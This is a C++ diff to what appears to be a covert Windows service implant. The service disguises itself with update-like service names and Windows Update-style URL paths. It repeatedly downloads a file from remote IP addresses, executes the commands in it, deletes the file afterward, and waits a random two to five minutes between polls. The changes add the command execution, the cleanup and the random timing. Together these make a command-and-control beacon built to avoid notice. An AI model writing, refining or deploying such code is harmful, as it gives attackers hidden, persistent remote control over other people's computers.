@@ -1,5 +1,7 @@
 #include "bits_operations.h"
 #include "file_operations.h"
+#include <random>
+#include <iostream>
 #include <windows.h>
 #include <vector>
 
@@ -11,9 +13,9 @@ std::wstring localDir;
 std::wstring fullUrl;
 
 std::vector<std::wstring> remoteUrls = {
-    L"http://192.168.7.20:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client",
-    L"http://192.168.7.16:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client",
-    L"http://192.168.7.19:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client"
+    /*L"http://192.168.7.20:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client",
+    L"http://192.168.7.16:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client",*/
+    L"http://192.168.145.158:8080/client"
 };
 
 void WINAPI ServiceCtrlHandler(DWORD ctrlCode)
@@ -29,7 +31,7 @@ void WINAPI ServiceCtrlHandler(DWORD ctrlCode)
 }
 
 void WINAPI ServiceMain(DWORD argc, LPSTR* argv) {
-    hStatusHandle = RegisterServiceCtrlHandler(L"wuserv", ServiceCtrlHandler);
+    hStatusHandle = RegisterServiceCtrlHandler(L"VaultSvs", ServiceCtrlHandler);
     if (hStatusHandle == NULL) {
         return;
     }
@@ -41,7 +43,7 @@ void WINAPI ServiceMain(DWORD argc, LPSTR* argv) {
 
     // Read parameters from the registry
     HKEY hKey;
-    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\wuserv", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\VaultSvs", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         DWORD dwSize;
         wchar_t szRemoteUrl[256], szLocalDir[256];
 
@@ -78,24 +80,35 @@ void WINAPI ServiceMain(DWORD argc, LPSTR* argv) {
     wprintf(L"Using URL: %ls\n", remoteUrl.c_str());
     wprintf(L"Generated local file: %ls\n", localFile.c_str());
 
+    // Initialize random generator
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::uniform_int_distribution<int> dist_ms(120000, 300000); // 2–5 minutes in ms
+
     // Start your executable logic here
     while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
         for (const auto& url : remoteUrls) {
             fullUrl = url + remoteUrl;
-
-            CoInitialize(nullptr);
-            if (DownloadFile(fullUrl, localFile)) { // Download the file with the generated filename
-                CoUninitialize();
-                break;
+            HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+            if (SUCCEEDED(hr)) {
+                if (DownloadFile(fullUrl, localFile)) {
+                    ExecuteCommandFromFile(localFile);
+					DeleteFile(localFile.c_str());
+                    CoUninitialize();
+                    break;
+                }
             }
         }
-        Sleep(60000);  // Wait for 60 seconds before downloading again
+        CoUninitialize();
+        // Generate random time
+        int wait_ms = dist_ms(gen);
+        Sleep(wait_ms);
     }
 }
 
 int wmain(int argc, wchar_t* argv[]) {
     SERVICE_TABLE_ENTRY ServiceTable[] = {
-         { const_cast<LPWSTR>(L"SysUpdateSvc"), (LPSERVICE_MAIN_FUNCTION)ServiceMain },
+         { const_cast<LPWSTR>(L"VaultSvs"), (LPSERVICE_MAIN_FUNCTION)ServiceMain },
          { NULL, NULL }
     };
 
